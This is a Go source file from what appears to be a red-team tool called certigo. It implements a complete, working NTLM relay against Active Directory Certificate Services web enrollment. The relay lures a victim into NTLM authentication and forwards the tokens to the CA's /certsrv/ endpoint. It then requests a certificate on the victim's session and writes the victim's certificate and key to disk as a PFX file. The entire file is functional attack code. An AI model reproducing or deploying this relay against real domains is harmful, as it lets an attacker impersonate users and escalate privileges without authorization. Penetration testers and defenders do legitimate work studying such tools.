// Package relay implements certigo's NTLM-to-AD-CS relay. It listens for
// inbound HTTP(S) requests, answers with a 401 / WWW-Authenticate challenge
// to solicit NTLM from the victim, then forwards the NEGOTIATE/AUTHENTICATE
// tokens to an outbound AD CS web-enrollment endpoint (/certsrv/). Once the
// victim's AUTHENTICATE is accepted by the CA, the relay posts a CSR to
// /certsrv/certfnsh.asp, fetches the issued certificate, and drops a PFX
// under OutDir named after the victim's NTLM user-name field.
//
// Limitations:
//   - HTTP/1.1 only. NTLM is a per-connection protocol; we rely on Go's
//     default http.Transport keep-alive plus a cookie jar so the target-side
//     session state survives between the NEGOTIATE and AUTHENTICATE
//     round-trips. CAs that rotate connections aggressively may reject the
//     AUTHENTICATE.
//   - No NTLM signing / sealing ("MIC" enforcement on the target will break
//     us - we do not rewrite tokens).
//   - No TLS channel-binding tokens. A CA with EPA enforced will refuse the
//     relayed AUTHENTICATE.
//   - One victim session at a time per source TCP endpoint; state is keyed
//     on r.RemoteAddr and expires after 60s of inactivity.
package relay

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode/utf16"

	"github.com/ajm4n/certigo/internal/pki"
)

// Options configures the relay server.
type Options struct {
	Listen    string // e.g. ":80"
	TargetURL string // e.g. "https://ca.ctg.local/certsrv/"
	Template  string // default "User"
	TLSCert   string // optional: enables HTTPS listener
	TLSKey    string
	OutDir    string // PFXes written here
	Insecure  bool   // skip TLS verify on outbound
}

// sessionTTL bounds how long we keep a victim's NEGOTIATE->AUTHENTICATE
// bookkeeping in memory before garbage-collecting it.
const sessionTTL = 60 * time.Second

// session tracks the per-victim relay state between the NEGOTIATE and
// AUTHENTICATE legs. The outbound *http.Client has a cookie jar so any
// ASP session cookie the CA sets on the 401 round-trip carries into the
// AUTHENTICATE request.
type session struct {
	outClient *http.Client
	jar       http.CookieJar
	target    string // full URL, e.g. https://ca.ctg.local/certsrv/
	last      time.Time
}

// relay is the running state of a single listener.
type relay struct {
	opts     Options
	target   *url.URL
	mu       sync.Mutex
	sessions map[string]*session
	hitCount atomic.Int64
}

// Run starts the HTTP(S) listener and blocks until the server returns.
func Run(opts Options) error {
	if opts.Listen == "" {
		return errors.New("relay: Options.Listen required")
	}
	r, mux, err := newServer(opts)
	if err != nil {
		return err
	}

	srv := &http.Server{
		Addr:              opts.Listen,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}

	log.Printf("relay: listening on %s (target=%s template=%s outDir=%s)", opts.Listen, r.opts.TargetURL, r.opts.Template, r.opts.OutDir)
	if opts.TLSCert != "" && opts.TLSKey != "" {
		return srv.ListenAndServeTLS(opts.TLSCert, opts.TLSKey)
	}
	return srv.ListenAndServe()
}

// newServer is the shared constructor used by Run and by tests driving an
// httptest.Server against the relay handler directly.
func newServer(opts Options) (*relay, http.Handler, error) {
	if opts.TargetURL == "" {
		return nil, nil, errors.New("relay: Options.TargetURL required")
	}
	if opts.Template == "" {
		opts.Template = "User"
	}
	if opts.OutDir == "" {
		opts.OutDir = "./relayed-pfx"
	}
	if err := os.MkdirAll(opts.OutDir, 0o750); err != nil {
		return nil, nil, fmt.Errorf("relay: mkdir OutDir: %w", err)
	}

	tgt, err := url.Parse(opts.TargetURL)
	if err != nil {
		return nil, nil, fmt.Errorf("relay: parse TargetURL: %w", err)
	}
	if tgt.Scheme != "http" && tgt.Scheme != "https" {
		return nil, nil, fmt.Errorf("relay: TargetURL scheme must be http or https, got %q", tgt.Scheme)
	}

	r := &relay{
		opts:     opts,
		target:   tgt,
		sessions: make(map[string]*session),
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/health", r.handleHealth)
	mux.HandleFunc("/", r.handleRelay)
	return r, mux, nil
}

func (r *relay) handleHealth(w http.ResponseWriter, _ *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = fmt.Fprintln(w, `{"status":"ok"}`)
}

// handleRelay is the NTLM MITM entry point.
//
// Flow:
//  1. No Authorization header => 401 + WWW-Authenticate: Negotiate, NTLM.
//  2. Authorization: NTLM <b64 NEGOTIATE> (message type 1):
//     forward to target /certsrv/, read the target's 401 challenge,
//     reflect it to the client.
//  3. Authorization: NTLM <b64 AUTHENTICATE> (message type 3):
//     forward to target, extract victim username, on success issue a
//     cert via /certsrv/certfnsh.asp, save PFX under OutDir.
func (r *relay) handleRelay(w http.ResponseWriter, req *http.Request) {
	n := r.hitCount.Add(1)
	auth := req.Header.Get("Authorization")
	log.Printf("relay[%d]: %s %s from %s (auth=%s)", n, req.Method, req.URL.Path, req.RemoteAddr, summarizeAuth(auth))

	if auth == "" {
		w.Header().Set("WWW-Authenticate", "Negotiate, NTLM")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	raw, ok := parseNTLMAuth(auth)
	if !ok {
		w.Header().Set("WWW-Authenticate", "Negotiate, NTLM")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	token, err := base64.StdEncoding.DecodeString(raw)
	if err != nil {
		log.Printf("relay[%d]: malformed base64 in Authorization: %v", n, err)
		http.Error(w, "bad NTLM token", http.StatusBadRequest)
		return
	}
	if len(token) < 12 {
		http.Error(w, "short NTLM token", http.StatusBadRequest)
		return
	}
	msgType := binary.LittleEndian.Uint32(token[8:12])

	switch msgType {
	case 1: // NEGOTIATE
		r.handleNegotiate(w, req, raw)
	case 3: // AUTHENTICATE
		r.handleAuthenticate(w, req, raw, token)
	default:
		log.Printf("relay[%d]: unexpected NTLM message type %d", n, msgType)
		w.Header().Set("WWW-Authenticate", "Negotiate, NTLM")
		w.WriteHeader(http.StatusUnauthorized)
	}
}

// handleNegotiate forwards the NEGOTIATE blob to the target and reflects
// the target's CHALLENGE blob back to the victim.
func (r *relay) handleNegotiate(w http.ResponseWriter, req *http.Request, negB64 string) {
	sess := r.newSession()
	r.storeSession(req.RemoteAddr, sess)

	challengeB64, err := sess.forwardToTarget(negB64)
	if err != nil {
		log.Printf("relay: forward NEGOTIATE to target: %v", err)
		http.Error(w, "relay: target unreachable", http.StatusBadGateway)
		return
	}
	w.Header().Set("WWW-Authenticate", "NTLM "+challengeB64)
	w.WriteHeader(http.StatusUnauthorized)
}

// handleAuthenticate forwards the AUTHENTICATE blob on the same outbound
// session. On success, it tries to request a certificate and save a PFX.
func (r *relay) handleAuthenticate(w http.ResponseWriter, req *http.Request, authB64 string, rawToken []byte) {
	sess := r.loadSession(req.RemoteAddr)
	if sess == nil {
		// Fall back: start a brand-new session. The target will almost
		// certainly reject this (no matching CHALLENGE), but we still
		// surface its response.
		log.Printf("relay: no pending session for %s; starting cold", req.RemoteAddr)
		sess = r.newSession()
	}
	defer r.deleteSession(req.RemoteAddr)

	body, statusCode, err := sess.authenticate(authB64)
	if err != nil {
		log.Printf("relay: forward AUTHENTICATE to target: %v", err)
		http.Error(w, "relay: target unreachable", http.StatusBadGateway)
		return
	}
	if statusCode >= 400 {
		log.Printf("relay: target rejected AUTHENTICATE (status %d)", statusCode)
		http.Error(w, fmt.Sprintf("relay: target rejected authentication (status %d)", statusCode), http.StatusUnauthorized)
		return
	}

	victim := extractUserName(rawToken)
	if victim == "" {
		victim = "victim"
	}
	log.Printf("relay: victim=%s authenticated at target (status %d, body=%d bytes)", victim, statusCode, len(body))

	// Try to issue a cert on the victim's authenticated session.
	certPath, issueErr := sess.issueCert(r.opts, victim)
	if issueErr != nil {
		log.Printf("relay: cert issuance failed for %s: %v", victim, issueErr)
		w.WriteHeader(http.StatusOK)
		_, _ = fmt.Fprintf(w, "relay: captured auth for %q but cert issuance failed: %v\n", victim, issueErr)
		return
	}

	w.WriteHeader(http.StatusOK)
	_, _ = fmt.Fprintf(w, "relay: issued cert for %q, saved %s\n", victim, certPath)
}

// newSession spins up an outbound HTTP client with a cookie jar.
func (r *relay) newSession() *session {
	jar, _ := cookiejar.New(nil)
	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: r.opts.Insecure}, // #nosec G402 - opt-in via --insecure
		DisableKeepAlives:   false,
		MaxIdleConnsPerHost: 2,
		IdleConnTimeout:     30 * time.Second,
	}
	return &session{
		outClient: &http.Client{
			Transport: tr,
			Jar:       jar,
			Timeout:   30 * time.Second,
		},
		jar:    jar,
		target: r.opts.TargetURL,
		last:   time.Now(),
	}
}

func (r *relay) storeSession(key string, s *session) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.gcLocked()
	r.sessions[key] = s
}

func (r *relay) loadSession(key string) *session {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.gcLocked()
	s := r.sessions[key]
	if s != nil {
		s.last = time.Now()
	}
	return s
}

func (r *relay) deleteSession(key string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.sessions, key)
}

func (r *relay) gcLocked() {
	cutoff := time.Now().Add(-sessionTTL)
	for k, s := range r.sessions {
		if s.last.Before(cutoff) {
			delete(r.sessions, k)
		}
	}
}

// forwardToTarget sends a NEGOTIATE token to the target's /certsrv/ and
// returns the base64 challenge the target answered with.
func (s *session) forwardToTarget(negB64 string) (string, error) {
	req, err := http.NewRequest(http.MethodGet, s.target, nil)
	if err != nil {
		return "", fmt.Errorf("build NEGOTIATE request: %w", err)
	}
	req.Header.Set("Authorization", "NTLM "+negB64)
	req.Header.Set("User-Agent", "certigo-relay/0.1")

	resp, err := s.outClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("do NEGOTIATE: %w", err)
	}
	defer func() { _, _ = io.Copy(io.Discard, resp.Body); _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusUnauthorized {
		return "", fmt.Errorf("target returned status %d (want 401 with challenge)", resp.StatusCode)
	}
	challenge := extractNTLMHeader(resp.Header.Values("WWW-Authenticate"))
	if challenge == "" {
		return "", errors.New("target 401 lacked WWW-Authenticate: NTLM <challenge>")
	}
	s.last = time.Now()
	return challenge, nil
}

// authenticate forwards the AUTHENTICATE blob on the same outbound client
// (cookie jar carries any ASP session state set by the 401 round-trip) and
// returns the response body + status.
func (s *session) authenticate(authB64 string) ([]byte, int, error) {
	req, err := http.NewRequest(http.MethodGet, s.target, nil)
	if err != nil {
		return nil, 0, fmt.Errorf("build AUTHENTICATE request: %w", err)
	}
	req.Header.Set("Authorization", "NTLM "+authB64)
	req.Header.Set("User-Agent", "certigo-relay/0.1")

	resp, err := s.outClient.Do(req)
	if err != nil {
		return nil, 0, fmt.Errorf("do AUTHENTICATE: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()
	body, _ := io.ReadAll(resp.Body)
	s.last = time.Now()
	return body, resp.StatusCode, nil
}

// issueCert generates an RSA key + CSR for the victim and POSTs it to
// /certsrv/certfnsh.asp over the authenticated session, then fetches the
// issued cert via /certsrv/certnew.cer and writes the PFX to disk.
func (s *session) issueCert(opts Options, victim string) (string, error) {
	key, err := pki.GenerateRSAKey(2048)
	if err != nil {
		return "", fmt.Errorf("genkey: %w", err)
	}

	csrDER, err := pki.BuildCSR(key, pki.NewCSRRequest{
		Subject: pkix.Name{CommonName: sanitizeUser(victim)},
	})
	if err != nil {
		return "", fmt.Errorf("buildcsr: %w", err)
	}
	csrPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE REQUEST", Bytes: csrDER})

	base, err := buildCertSrvBase(s.target)
	if err != nil {
		return "", err
	}

	form := url.Values{}
	form.Set("Mode", "newreq")
	form.Set("CertRequest", string(csrPEM))
	form.Set("CertAttrib", fmt.Sprintf("CertificateTemplate:%s\r\n", opts.Template))
	form.Set("TargetStoreFlags", "0")
	form.Set("SaveCert", "yes")

	postReq, err := http.NewRequest(http.MethodPost, base+"/certsrv/certfnsh.asp", strings.NewReader(form.Encode()))
	if err != nil {
		return "", fmt.Errorf("build certfnsh request: %w", err)
	}
	postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	postReq.Header.Set("User-Agent", "certigo-relay/0.1")

	postResp, err := s.outClient.Do(postReq)
	if err != nil {
		return "", fmt.Errorf("certfnsh POST: %w", err)
	}
	defer func() { _ = postResp.Body.Close() }()

	body, _ := io.ReadAll(postResp.Body)
	if postResp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("certfnsh status %d: %s", postResp.StatusCode, truncate(string(body), 200))
	}

	m := reqIDRegexp.FindStringSubmatch(string(body))
	if m == nil {
		return "", fmt.Errorf("ReqID not found in certfnsh response")
	}
	reqID := m[1]

	getURL := fmt.Sprintf("%s/certsrv/certnew.cer?ReqID=%s&Enc=b64", base, reqID)
	getReq, err := http.NewRequest(http.MethodGet, getURL, nil)
	if err != nil {
		return "", fmt.Errorf("build certnew request: %w", err)
	}
	getReq.Header.Set("User-Agent", "certigo-relay/0.1")
	getResp, err := s.outClient.Do(getReq)
	if err != nil {
		return "", fmt.Errorf("certnew GET: %w", err)
	}
	defer func() { _ = getResp.Body.Close() }()
	certBody, _ := io.ReadAll(getResp.Body)

	cert, err := parseCertResponse(certBody)
	if err != nil {
		return "", err
	}

	pfx, err := pki.SavePFX(&pki.Certificate{Cert: cert, Key: key}, "")
	if err != nil {
		return "", fmt.Errorf("encode pfx: %w", err)
	}

	outPath := filepath.Join(opts.OutDir, sanitizeUser(victim)+".pfx")
	if err := os.WriteFile(outPath, pfx, 0o600); err != nil {
		return "", fmt.Errorf("write pfx: %w", err)
	}
	return outPath, nil
}

// --- helpers ---

// parseNTLMAuth accepts "NTLM <b64>" or "Negotiate <b64>" and returns the
// base64 chunk. Case-insensitive on the scheme.
func parseNTLMAuth(h string) (string, bool) {
	parts := strings.SplitN(strings.TrimSpace(h), " ", 2)
	if len(parts) != 2 {
		return "", false
	}
	scheme := strings.ToLower(parts[0])
	if scheme != "ntlm" && scheme != "negotiate" {
		return "", false
	}
	return strings.TrimSpace(parts[1]), true
}

// extractNTLMHeader picks the "NTLM <b64>" token out of a WWW-Authenticate
// header list. Returns "" if no NTLM scheme is present.
func extractNTLMHeader(headers []string) string {
	for _, h := range headers {
		for _, c := range strings.Split(h, ",") {
			c = strings.TrimSpace(c)
			if len(c) < 5 {
				continue
			}
			if strings.EqualFold(c[:4], "NTLM") && (c[4] == ' ' || c[4] == '\t') {
				return strings.TrimSpace(c[5:])
			}
		}
	}
	return ""
}

func summarizeAuth(a string) string {
	if a == "" {
		return "<none>"
	}
	if len(a) > 32 {
		return a[:32] + "..."
	}
	return a
}

// extractUserName pulls UserNameFields (UTF-16-LE) out of an
// AUTHENTICATE_MESSAGE blob per MS-NLMP §2.2.1.3. Returns "" on any parse
// failure.
//
// Fixed layout relevant to us:
//
//	signature(8) messageType(4)
//	LmChallengeResponseFields(8)
//	NtChallengeResponseFields(8)
//	DomainNameFields(8)
//	UserNameFields(8)   <-- offset 36
func extractUserName(data []byte) string {
	if len(data) < 44 {
		return ""
	}
	userLen := binary.LittleEndian.Uint16(data[36:38])
	userOff := binary.LittleEndian.Uint32(data[40:44])
	if userLen == 0 || int(userOff)+int(userLen) > len(data) {
		return ""
	}
	raw := data[userOff : int(userOff)+int(userLen)]
	if len(raw)%2 != 0 {
		return ""
	}
	pts := make([]uint16, len(raw)/2)
	for i := 0; i < len(pts); i++ {
		pts[i] = binary.LittleEndian.Uint16(raw[2*i : 2*i+2])
	}
	return string(utf16.Decode(pts))
}

// sanitizeUser strips characters that would be unsafe as a filename.
func sanitizeUser(u string) string {
	u = strings.TrimSpace(u)
	if u == "" {
		return "victim"
	}
	var b strings.Builder
	for _, r := range u {
		switch {
		case r == '/' || r == '\\' || r == ':' || r == '*' || r == '?' || r == '"' || r == '<' || r == '>' || r == '|':
			b.WriteByte('_')
		case r < 0x20:
			b.WriteByte('_')
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// buildCertSrvBase returns the scheme://host[:port] prefix of the target URL
// (dropping any /certsrv/ suffix) so callers can append arbitrary
// /certsrv/... paths.
func buildCertSrvBase(target string) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", fmt.Errorf("parse target: %w", err)
	}
	return fmt.Sprintf("%s://%s", u.Scheme, u.Host), nil
}

var reqIDRegexp = regexp.MustCompile(`ReqID=(\d+)`)

// parseCertResponse returns the parsed X.509 cert from a certnew.cer reply
// (accepts PEM, raw DER, or base64-encoded DER).
func parseCertResponse(body []byte) (*x509.Certificate, error) {
	block, _ := pem.Decode(body)
	if block != nil && block.Type == "CERTIFICATE" {
		return x509.ParseCertificate(block.Bytes)
	}
	cleaned := bytes.TrimSpace(body)
	if d, err := base64.StdEncoding.DecodeString(string(cleaned)); err == nil {
		if c, err := x509.ParseCertificate(d); err == nil {
			return c, nil
		}
	}
	if c, err := x509.ParseCertificate(body); err == nil {
		return c, nil
	}
	return nil, errors.New("certnew: cannot parse response (not PEM/base64/DER)")
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
